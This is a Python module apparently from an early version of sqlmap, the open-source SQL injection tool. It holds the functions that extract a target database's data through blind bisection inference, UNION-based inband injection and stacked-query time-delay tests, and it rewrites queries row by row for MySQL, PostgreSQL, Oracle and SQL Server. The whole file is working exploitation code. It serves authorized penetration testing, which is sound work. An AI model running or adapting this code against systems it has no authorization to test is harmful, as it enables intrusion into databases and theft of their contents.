#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.core.agent import agent
from lib.core.common import cleanQuery
from lib.core.common import dataToSessionFile
from lib.core.common import expandAsteriskForColumns
from lib.core.common import readInput
from lib.core.common import replaceNewlineTabs
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.data import temp
from lib.core.settings import TIME_DELAY
from lib.request.connect import Connect as Request
from lib.techniques.inband.union.use import unionUse
from lib.techniques.blind.inference import bisection
from lib.utils.resume import queryOutputLength
from lib.utils.resume import resume


def __goInference(payload, expression):
    start = time.time()

    if ( conf.eta or conf.threads > 1 ) and kb.dbms:
        _, length, _ = queryOutputLength(expression, payload)
    else:
        length = None

    dataToSessionFile("[%s][%s][%s][%s][" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], expression))

    count, value = bisection(payload, expression, length=length)
    duration = int(time.time() - start)

    if conf.eta and length:
        infoMsg = "retrieved: %s" % value
        logger.info(infoMsg)

    infoMsg = "performed %d queries in %d seconds" % (count, duration)
    logger.info(infoMsg)

    return value


def __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected=None):
    outputs = []

    for field in expressionFieldsList:
        output = None

        expressionReplaced = expression.replace(expressionFields, field, 1)
        output = resume(expressionReplaced, payload)

        if not output or ( expected == "int" and not output.isdigit() ):
            if output:
                warnMsg  = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __goInference(payload, expressionReplaced)

        outputs.append(output)

    return outputs


def __goInferenceProxy(expression, fromUser=False, expected=None):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    query          = agent.prefixQuery(" %s" % temp.inference)
    query          = agent.postfixQuery(query)
    payload        = agent.payload(newValue=query)
    count          = None
    startLimit     = 0
    stopLimit      = None
    outputs        = []
    test           = None
    untilLimitChar = None
    untilOrderChar = None

    output = resume(expression, payload)

    if output and ( expected == None or ( expected == "int" and output.isdigit() ) ):
        return output

    if kb.dbmsDetected:
        _, _, _, expressionFieldsList, expressionFields = agent.getFields(expression)

        if len(expressionFieldsList) > 1:
            infoMsg  = "the SQL query provided has more than a field. "
            infoMsg += "sqlmap will now unpack it into distinct queries "
            infoMsg += "to be able to retrieve the output even if we "
            infoMsg += "are going blind"
            logger.info(infoMsg)

        # If we have been here from SQL query/shell we have to check if
        # the SQL query might return multiple entries and in such case
        # forge the SQL limiting the query output one entry per time
        # NOTE: I assume that only queries that get data from a table
        # can return multiple entries
        if fromUser and " FROM " in expression:
            limitRegExp = re.search(queries[kb.dbms].limitregexp, expression, re.I)

            if limitRegExp:
                if kb.dbms in ( "MySQL", "PostgreSQL" ):
                    limitGroupStart = queries[kb.dbms].limitgroupstart
                    limitGroupStop  = queries[kb.dbms].limitgroupstop

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif kb.dbms in ( "Oracle", "Microsoft SQL Server" ):
                    limitCond = False
            else:
                limitCond = True

            # I assume that only queries NOT containing a "LIMIT #, 1"
            # (or similar depending on the back-end DBMS) can return
            # multiple entries
            if limitCond:
                if limitRegExp:
                    stopLimit = int(stopLimit)

                    # From now on we need only the expression until the " LIMIT "
                    # (or similar, depending on the back-end DBMS) word
                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        stopLimit += startLimit
                        untilLimitChar = expression.index(queries[kb.dbms].limitstring)
                        expression = expression[:untilLimitChar]

                if not stopLimit or stopLimit <= 1:
                    if kb.dbms == "Oracle" and expression.endswith("FROM DUAL"):
                        test = "n"
                    else:
                        message  = "does the SQL query that you provide might "
                        message += "return multiple entries? [Y/n] "
                        test = readInput(message, default="Y")

                if not test or test[0] in ("y", "Y"):
                    # Count the number of SQL query entries output
                    countFirstField   = queries[kb.dbms].count % expressionFieldsList[0]
                    countedExpression = expression.replace(expressionFields, countFirstField, 1)

                    if re.search(" ORDER BY ", expression, re.I):
                        untilOrderChar = countedExpression.index(" ORDER BY ")
                        countedExpression = countedExpression[:untilOrderChar]

                    count = resume(countedExpression, payload)

                    if not stopLimit:
                        if not count or not count.isdigit():
                            count = __goInference(payload, countedExpression)

                        if count.isdigit() and int(count) > 0:
                            count = int(count)

                            message  = "the SQL query that you provide can "
                            message += "return up to %d entries. How many " % count
                            message += "entries do you want to retrieve?\n"
                            message += "[a] All (default)\n[#] Specific number\n"
                            message += "[q] Quit\nChoice: "
                            test = readInput(message, default="a")

                            if not test or test[0] in ("a", "A"):
                                stopLimit = count

                            elif test[0] in ("q", "Q"):
                                return "Quit"

                            elif test.isdigit() and int(test) > 0 and int(test) <= count:
                                stopLimit = int(test)

                                infoMsg  = "sqlmap is now going to retrieve the "
                                infoMsg += "first %d query output entries" % stopLimit
                                logger.info(infoMsg)

                            elif test[0] in ("#", "s", "S"):
                                message = "How many? "
                                stopLimit = readInput(message, default="10")

                                if not stopLimit.isdigit():
                                    errMsg = "Invalid choice"
                                    logger.error(errMsg)

                                    return None

                                else:
                                    stopLimit = int(stopLimit)

                            else:
                                errMsg = "Invalid choice"
                                logger.error(errMsg)

                                return None

                        elif ( not count or int(count) == 0 ):
                            warnMsg  = "the SQL query that you provided does "
                            warnMsg += "not return any output"
                            logger.warn(warnMsg)

                            return None

                    elif ( not count or int(count) == 0 ) and ( not stopLimit or stopLimit == 0 ):
                        warnMsg  = "the SQL query that you provided does "
                        warnMsg += "not return any output"
                        logger.warn(warnMsg)

                        return None

                    for num in xrange(startLimit, stopLimit):
                        limitedExpr = expression

                        if kb.dbms in ( "MySQL", "PostgreSQL" ):
                            limitStr = queries[kb.dbms].limit % (num, 1)
                            limitedExpr += " %s" % limitStr

                        elif kb.dbms == "Oracle":
                            limitStr     = queries[kb.dbms].limit
                            fromIndex    = limitedExpr.index(" FROM ")
                            untilFrom    = limitedExpr[:fromIndex]
                            fromFrom     = limitedExpr[fromIndex+1:]
                            limitedExpr  = "%s FROM (%s, %s" % (untilFrom, untilFrom, limitStr)
                            limitedExpr  = limitedExpr % fromFrom
                            limitedExpr += "=%d" % (num + 1)

                        elif kb.dbms == "Microsoft SQL Server":
                            if re.search(" ORDER BY ", limitedExpr, re.I):
                                untilOrderChar = limitedExpr.index(" ORDER BY ")
                                limitedExpr = limitedExpr[:untilOrderChar]

                            limitStr     = queries[kb.dbms].limit
                            fromIndex    = limitedExpr.index(" FROM ")
                            untilFrom    = limitedExpr[:fromIndex]
                            fromFrom     = limitedExpr[fromIndex+1:]
                            limitedExpr  = limitedExpr.replace("SELECT ", (limitStr % 1), 1)
                            limitedExpr  = "%s WHERE %s " % (limitedExpr, expressionFieldsList[0])
                            limitedExpr += "NOT IN (%s" % (limitStr % num)
                            limitedExpr += "%s %s)" % (expressionFieldsList[0], fromFrom)

                        output = __goInferenceFields(limitedExpr, expressionFields, expressionFieldsList, payload, expected)
                        outputs.append(output)

                    return outputs

        elif kb.dbms == "Oracle" and expression.startswith("SELECT ") and " FROM " not in expression:
            expression = "%s FROM DUAL" % expression

        outputs = __goInferenceFields(expression, expressionFields, expressionFieldsList, payload, expected)

        returnValue = ", ".join([output for output in outputs])
    else:
        returnValue = __goInference(payload, expression)

    return returnValue


def __goInband(expression, expected=None):
    """
    Retrieve the output of a SQL query taking advantage of an inband SQL
    injection vulnerability on the affected parameter.
    """

    counter = None
    output  = None
    partial = False
    data    = []

    condition = (
                  kb.resumedQueries and conf.url in kb.resumedQueries.keys()
                  and expression in kb.resumedQueries[conf.url].keys()
                )

    if condition:
        output = resume(expression, None)

        if not output or ( expected == "int" and not output.isdigit() ):
            partial = True

    if not output:
        output = unionUse(expression)

    fields = expression.split(",")
    counter = len(fields)

    if output:
        outCond1 = ( output.startswith(temp.start) and output.endswith(temp.stop) )
        outCond2 = ( output.startswith("__START__") and output.endswith("__STOP__") )

        if outCond1 or outCond2:
            if outCond1:
                regExpr = '%s(.*?)%s' % (temp.start, temp.stop)
            elif outCond2:
                regExpr = '__START__(.*?)__STOP__'

            output = re.findall(regExpr, output, re.S)

            if partial or not condition:
                logOutput = "".join(["__START__%s__STOP__" % replaceNewlineTabs(value) for value in output])
                dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], expression, logOutput))

            output = set(output)

            for entry in output:
                info = []

                if "__DEL__" in entry:
                    entry = entry.split("__DEL__")
                else:
                    entry = entry.split(temp.delimiter)

                if len(entry) == 1:
                    data.append(entry[0])
                else:
                    for value in entry:
                        info.append(value)

                    data.append(info)
        else:
            data = output

        if len(data) == 1 and isinstance(data[0], str):
            data = data[0]

    return data


def getValue(expression, blind=True, inband=True, fromUser=False, expected=None):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter. It can call a function to retrieve the output
    through inband SQL injection (if selected) and/or blind SQL injection
    (if selected).
    """

    expression = cleanQuery(expression)
    expression = expandAsteriskForColumns(expression)
    value      = None

    if inband and conf.unionUse and kb.dbms:
        value = __goInband(expression, expected)

    if blind and not value:
        value = __goInferenceProxy(expression, fromUser, expected)

    return value


def goStacked(expression, timeTest=False):
    """
    TODO: write description
    """

    comment        = queries[kb.dbms].comment
    query          = agent.prefixQuery("; %s" % expression)
    query          = agent.postfixQuery("%s; %s" % (query, comment))
    payload        = agent.payload(newValue=query)

    start    = time.time()
    Request.queryPage(payload)
    duration = int(time.time() - start)

    if timeTest:
        return (duration >= TIME_DELAY, payload)
    else:
        return duration >= TIME_DELAY
